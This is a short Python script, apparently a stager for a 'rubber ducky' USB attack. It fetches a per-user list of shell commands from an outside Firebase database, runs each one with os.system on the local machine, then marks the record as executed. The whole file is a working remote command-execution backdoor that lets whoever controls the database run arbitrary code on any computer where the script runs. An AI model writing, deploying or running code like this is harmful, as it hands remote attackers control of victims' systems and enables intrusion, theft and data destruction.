import requests
import json
import os

USER = os.environ["USER"]
URL = "https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app"

rq = requests.get(f"{URL}/users.json")
userData = rq.json()[USER]

if userData['executed'] == True: exit(0)

for cmd in userData['commands']:
    os.system(cmd)

userData['executed'] = True
requests.patch(f"{URL}/users/{USER}.json", data=json.dumps(userData))